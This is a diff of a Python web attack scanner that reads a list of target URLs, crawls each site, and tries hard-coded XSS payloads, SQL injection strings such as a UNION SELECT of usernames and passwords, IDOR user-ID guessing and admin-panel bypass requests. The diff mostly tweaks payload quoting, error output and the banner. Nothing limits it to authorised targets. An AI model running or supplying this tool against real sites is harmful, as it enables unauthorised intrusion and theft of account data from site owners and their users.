@@ -1,14 +1,14 @@
 import requests
 from bs4 import BeautifulSoup
 import pandas as pd
-from colorama import Fore, init
+from colorama import Fore, Style, init
 from tqdm import tqdm
 import pyfiglet
 
 init(autoreset=True)
 
 # Payloads for vulnerabilities
-xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>", "<body onload=alert('XSS')>"]
+xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<body onload=alert(1)>"]
 sql_payloads = ["' OR 1=1 --", "' AND 1=2 UNION SELECT NULL,NULL --", "' UNION SELECT username, password FROM users --"]
 idor_user_ids = [1, 2, 999, 1000]
 bypass_payloads = [
@@ -22,7 +22,6 @@ test_parameters = ["id", "user", "page", "search", "query", "product"]
 
 # Crawl website for endpoints
 def crawl_website(base_url):
-    visited = set()
     endpoints = set()
     try:
         response = requests.get(base_url, timeout=10)
@@ -31,15 +30,11 @@ def crawl_website(base_url):
             href = link['href']
             if href.startswith('/'):
                 full_url = base_url.rstrip('/') + href
-                if full_url not in visited:
-                    visited.add(full_url)
-                    endpoints.add(full_url)
+                endpoints.add(full_url)
             elif base_url in href:
-                if href not in visited:
-                    visited.add(href)
-                    endpoints.add(href)
-    except requests.exceptions.RequestException:
-        pass
+                endpoints.add(href)
+    except requests.exceptions.RequestException as e:
+        print(Fore.RED + f"Error crawling {base_url}: {e}")
     return endpoints
 
 # Vulnerability scan functions
@@ -61,7 +56,7 @@ def scan_sql_injection(url):
         for payload in sql_payloads:
             try:
                 response = requests.get(url, params={param: payload}, timeout=10)
-                if "syntax" in response.text.lower() or "mysql" in response.text.lower() or "error" in response.text.lower():
+                if "syntax error" in response.text.lower() or "mysql" in response.text.lower() or "error" in response.text.lower():
                     results.append({"Path": url, "Parameter": param, "Payload": payload})
             except requests.exceptions.RequestException:
                 continue
@@ -93,18 +88,15 @@ def bypass_admin_panel(admin_url):
 
 # Main scan function
 def scan_site(base_url):
+    print(Fore.CYAN + f"Scanning site: {base_url}")
     endpoints = crawl_website(base_url)
     vulnerabilities = {"XSS": [], "SQL Injection": [], "IDOR": [], "Admin Bypass": []}
 
     for endpoint in tqdm(endpoints, desc=f"Scanning {base_url}", ncols=100):
-        # XSS Scan
         vulnerabilities["XSS"].extend(scan_xss(endpoint))
-        # SQL Injection Scan
         vulnerabilities["SQL Injection"].extend(scan_sql_injection(endpoint))
-        # IDOR Scan
         vulnerabilities["IDOR"].extend(scan_idor(endpoint))
 
-    # Admin Bypass
     admin_results = bypass_admin_panel(f"{base_url}/admin")
     if admin_results:
         vulnerabilities["Admin Bypass"].extend(admin_results)
@@ -123,10 +115,10 @@ def display_results(all_results):
 
 # Entry point
 def main():
-    print(Fore.CYAN + pyfiglet.figlet_format("Tools Root", font="slant"))
+    print(Fore.CYAN + pyfiglet.figlet_format("Root Scanner", font="slant"))
     filename = input(Fore.CYAN + "Enter the file containing URLs (e.g., list.txt): ")
 
-    if not filename or not filename.endswith('.txt'):
+    if not filename.endswith('.txt'):
         print(Fore.RED + "Invalid file format. Please provide a .txt file.")
         return
 
